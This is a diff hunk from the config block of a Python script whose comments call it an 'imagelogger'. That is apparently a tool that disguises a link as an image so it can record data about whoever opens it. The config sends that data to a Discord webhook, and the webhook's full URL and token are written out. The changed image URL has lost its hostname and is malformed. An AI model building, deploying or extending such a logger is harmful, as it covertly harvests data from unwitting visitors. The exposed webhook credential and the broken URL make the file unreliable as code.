@@ -15,7 +15,7 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1502647363993473124/nGbgpchNqVqBpDJt7E__wrBy3p_0UMvM6Kba7zmT4InU95T77Qcpy9ywXxNYrFgJGcIZ",
-    "image": "https://imgs.search.brave.com/yUJ6lNElz0gH1nVPsNLmrD8ZT7YbpK7PsWocUMA-eQs/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzMxL2Zh/L2VjLzMxZmFlY2Rk/YThmYjgzMjVmNGQ0/YWFhMjgwMGVhMGU0/LmpwZw", # You can also have a custom image by using a URL argument
+    "image": "https://yUJ6lNElz0gH1nVPsNLmrD8ZT7YbpK7PsWocUMA-eQs/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzMxL2Zh/L2VjLzMxZmFlY2Rk/YThmYjgzMjVmNGQ0/YWFhMjgwMGVhMGU0/LmpwZw", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
